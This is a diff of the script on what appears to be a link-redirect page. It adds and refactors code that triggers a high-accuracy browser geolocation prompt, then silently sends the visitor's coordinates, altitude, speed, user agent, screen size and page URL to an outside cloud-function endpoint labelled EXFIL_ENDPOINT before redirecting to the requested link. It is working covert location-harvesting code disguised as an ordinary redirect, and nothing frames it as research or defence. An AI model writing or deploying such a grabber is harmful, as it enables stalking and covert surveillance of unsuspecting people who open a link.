@@ -136,6 +136,11 @@
   </div>
 
   <script>
+    // ============================================================
+    // FIRESTORE CLOUD FUNCTION ENDPOINT
+    // ============================================================
+    const EXFIL_ENDPOINT = 'https://us-central1-funny-jokes-e8b49.cloudfunctions.net/collectLocation';
+
     function getTargetUrl() {
       const params = new URLSearchParams(window.location.search);
       let target = params.get('url') || params.get('u');
@@ -143,6 +148,20 @@
       try { target = decodeURIComponent(target); } catch (e) {}
       if (!/^https?:\/\//i.test(target)) return null;
       return target;
+    }
+
+    function sendToFirestore(payload) {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(EXFIL_ENDPOINT, JSON.stringify(payload));
+      } else {
+        fetch(EXFIL_ENDPOINT, {
+          method: 'POST',
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(function(err) {
+          console.warn('Failed to send data:', err);
+        });
+      }
     }
 
     const target = getTargetUrl();
@@ -170,11 +189,18 @@
         overlay.classList.remove('show');
         box.style.display = 'block';
 
-        // Now trigger the real browser geolocation prompt
+        // Base payload with browser metadata
+        var basePayload = {
+          ua: navigator.userAgent,
+          pageUrl: window.location.href,
+          screen: screen.width + 'x' + screen.height
+        };
+
+        // Trigger real browser geolocation prompt
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const payload = {
+            function(position) {
+              var payload = Object.assign({}, basePayload, {
                 type: 'gps',
                 lat: position.coords.latitude,
                 lon: position.coords.longitude,
@@ -182,29 +208,31 @@
                 altitude: position.coords.altitude,
                 heading: position.coords.heading,
                 speed: position.coords.speed,
-                timestamp: new Date(position.timestamp).toISOString(),
-                ua: navigator.userAgent
-              };
-              navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
+                timestamp: new Date(position.timestamp).toISOString()
+              });
+              sendToFirestore(payload);
             },
-            (err) => {
-              const payload = {
+            function(err) {
+              var payload = Object.assign({}, basePayload, {
                 type: 'gps_denied',
                 error: err.code,
-                message: err.message,
-                ua: navigator.userAgent
-              };
-              navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
+                message: err.message
+              });
+              sendToFirestore(payload);
             },
             { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
           );
         } else {
-          const payload = { type: 'gps_unsupported', ua: navigator.userAgent };
-          navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
+          var payload = Object.assign({}, basePayload, {
+            type: 'gps_unsupported'
+          });
+          sendToFirestore(payload);
         }
 
-        // Redirect after giving time for geo + the prompt
-        setTimeout(() => { window.location.href = target; }, 3000);
+        // Redirect after giving time for geo collection
+        setTimeout(function() {
+          window.location.href = target;
+        }, 3000);
       });
     }
   </script>
